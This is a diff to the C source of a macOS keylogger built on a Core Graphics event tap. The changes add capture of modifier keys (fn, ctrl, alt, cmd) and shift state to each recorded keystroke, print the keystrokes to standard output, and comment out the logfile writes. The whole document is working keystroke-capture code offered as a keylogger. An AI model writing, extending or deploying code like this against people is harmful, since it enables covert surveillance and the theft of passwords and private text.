@@ -3,7 +3,7 @@
 int main(int argc, const char *argv[]) {
 
     // Create an event tap to retrieve keypresses.
-    CGEventMask eventMask = (CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged));
+    CGEventMask eventMask = (CGEventMaskBit(kCGEventKeyDown)/* | CGEventMaskBit(kCGEventFlagsChanged)*/);
     CFMachPortRef eventTap = CGEventTapCreate(
         kCGSessionEventTap, kCGHeadInsertEventTap, 0, eventMask, CGEventCallback, NULL
     );
@@ -42,7 +42,7 @@ int main(int argc, const char *argv[]) {
     }
 
     // Output to logfile.
-    fprintf(logfile, "\n\nKeylogging has begun.\n%s\n", asctime(localtime(&result)));
+    fprintf(logfile, "\n\nKeylogging has now begun.\n%s\n", asctime(localtime(&result)));
     fflush(logfile);
 
     // Display the location of the logfile and start the loop.
@@ -55,14 +55,33 @@ int main(int argc, const char *argv[]) {
 
 // The following callback method is invoked on every keypress.
 CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
-    if (type != kCGEventKeyDown && type != kCGEventFlagsChanged && type != kCGEventKeyUp) { return event; }
 
-    // Retrieve the incoming keycode.
+    char resultStr[100] = "\0";
+
+    CGEventFlags eFlags = CGEventGetFlags(event);
+
+    // check for pressed modifiers (fn, ctrl, alt, cmd) and add info to result string accordingly
+    if( CGEventGetFlags(event) & kCGEventFlagMaskSecondaryFn ) strcat(resultStr, "[fn]+");
+    if( CGEventGetFlags(event) & kCGEventFlagMaskControl )  strcat(resultStr, "[ctrl]+");
+    if( CGEventGetFlags(event) & kCGEventFlagMaskAlternate )  strcat(resultStr, "[alt]+");
+    if( CGEventGetFlags(event) & kCGEventFlagMaskCommand ) strcat(resultStr, "[cmd]+");
+
+    // check for shift and caps lock 
+    bool shift = false;
+    if( CGEventGetFlags(event) & kCGEventFlagMaskShift || CGEventGetFlags(event) & kCGEventFlagMaskAlphaShift ) shift = true;
+
+    // Retrieve the keycode as int, convert to char/string and append to resultStr
     CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
+    strcat(resultStr, convertKeyCode(keyCode)); 
 
+
+    printf("%s, %i\n", resultStr, (int)shift);
+    fflush(stdout);
+    
+    
     // Print the human readable key to the logfile.
-    fprintf(logfile, "%s", convertKeyCode(keyCode));
-    fflush(logfile);
+    // fprintf(logfile, "%s", convertKeyCode(keyCode));
+    // fflush(logfile);
 
     return event;
 }
@@ -141,16 +160,16 @@ const char *convertKeyCode(int keyCode) {
         case 49:  return " ";
         case 51:  return "[del]";
         case 53:  return "[esc]";
-        case 54:  return "[right-cmd]";
-        case 55:  return "[left-cmd]";
-        case 56:  return "[left-shift]";
-        case 57:  return "[caps]";
-        case 58:  return "[left-option]";
-        case 59:  return "[left-ctrl]";
-        case 60:  return "[right-shift]";
-        case 61:  return "[right-option]";
-        case 62:  return "[right-ctrl]";
-        case 63:  return "[fn]";
+        // case 54:  return "[right-cmd]";
+        // case 55:  return "[left-cmd]";
+        // case 56:  return "[left-shift]";
+        // case 57:  return "[caps]";
+        // case 58:  return "[left-option]";
+        // case 59:  return "[left-ctrl]";
+        // case 60:  return "[right-shift]";
+        // case 61:  return "[right-option]";
+        // case 62:  return "[right-ctrl]";
+        // case 63:  return "[fn]";
         case 64:  return "[f17]";
         case 72:  return "[volup]";
         case 73:  return "[voldown]";
@@ -185,5 +204,6 @@ const char *convertKeyCode(int keyCode) {
         case 125: return "[down]";
         case 126: return "[up]";
     }
-    return "[unknown]";
+    // return "[unknown]";
+    return "";
 }
